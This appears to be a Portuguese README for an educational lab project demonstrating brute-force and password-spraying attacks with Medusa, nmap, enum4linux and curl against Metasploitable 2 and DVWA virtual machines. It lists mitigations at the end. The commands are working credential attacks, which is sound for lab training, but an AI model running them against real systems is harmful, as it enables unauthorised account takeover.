README – Projeto de Força Bruta com Medusa

Este documento contém o README completo do projeto solicitado, incluindo:

Descrição do desafio

Objetivos

Ambiente configurado

Comandos utilizados

Cenários de ataque

Mitigações

Estrutura do repositório

Como executar o script .sh

Ataques de Força Bruta com Medusa em Ambiente Controlado
Visão Geral

Este projeto demonstra ataques de força bruta utilizando o Medusa no Kali Linux, explorando serviços vulneráveis no Metasploitable 2 e automação de ataques em aplicações web como a DVWA.
Tudo realizado em ambiente controlado para fins educativos e de laboratório.

Arquitetura do Ambiente
Máquinas Virtuais

Kali Linux (atacante)

Metasploitable 2 (vítima)

DVWA instalada separadamente

Configuração de Rede

Tipo: Host-Only Adapter (VirtualBox)

Descobrir IP:

ip a

Descoberta de Serviços
nmap -sV -p- 192.168.56.101

1) Ataque de Força Bruta FTP

Wordlist utilizada disponível no arquivo wordlist.txt deste projeto.

medusa -h 192.168.56.101 -u msfadmin -P wordlist.txt -M ftp

2) Ataque em Formulário Web DVWA

Automação base:

curl -X POST -d "username=admin&password=PASS&Login=Login" URL

3) Password Spraying SMB
Enumeração
enum4linux -U 192.168.56.101

Ataque
medusa -h 192.168.56.101 -U users.txt -p "123456" -M smbnt

Mitigações

Políticas de senha forte

Time-out e bloqueio após tentativas erradas

Captcha em formulários

Fail2ban

Redução da superfície de ataque

Auditoria e monitoramento contínuo

Estrutura do Repositório
README.md
wordlist.txt
users.txt
bruteforce.sh
/images/*

Como Executar o Script .sh

Dê permissão de execução:

chmod +x bruteforce.sh


Execute:

./bruteforce.sh


Caso queira rodar especificando os arquivos:

./bruteforce.sh wordlist.txt users.txt
